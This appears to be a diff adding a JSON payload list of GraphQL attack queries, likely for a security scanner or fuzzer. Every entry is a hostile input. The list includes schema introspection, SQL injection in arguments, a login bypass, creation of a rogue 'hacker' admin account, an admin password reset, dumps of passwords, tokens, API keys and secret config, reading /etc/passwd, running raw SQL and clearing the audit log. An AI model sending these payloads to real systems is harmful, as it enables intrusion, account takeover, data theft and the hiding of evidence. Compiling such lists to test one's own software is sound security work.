@@ -1,0 +1,24 @@
+{
+  "payloads": [
+    "{ __type(name: \"Admin\") { fields { name } } }",
+    "query { __schema { types { name fields { name } } } }",
+    "mutation { deleteUser(id: 1) }",
+    "{ user(id: \"1 OR 1=1\") { id name password } }",
+    "fragment FullUser on User { id email token } query { user(id: 1) { ...FullUser } }",
+    "{ allUsers { id email password } }",
+    "query { system { secret } }",
+    "mutation { login(username: \"admin\", password: \"' OR '1'='1\") { token } }",
+    "query { users { id username password token } }",
+    "mutation { createUser(username: \"hacker\", password: \"pwned\", role: \"admin\") }",
+    "query { me { id email apiKey } }",
+    "query { allPosts { id title content author { password } } }",
+    "mutation { resetPassword(email: \"admin@umkm.com\", newPassword: \"12345\") }",
+    "query { getConfig { databaseUrl secretKey } }",
+    "mutation { enableDebugMode(enable: true) }",
+    "query { search(query: \"' OR 1=1 --\") { results { id title } } }",
+    "query { auditLog { user action timestamp } }",
+    "mutation { clearAuditLog }",
+    "query { readFile(path: \"/etc/passwd\") { content } }",
+    "query { executeSQL(sql: \"SELECT * FROM users\") { rows } }"
+  ]
+}
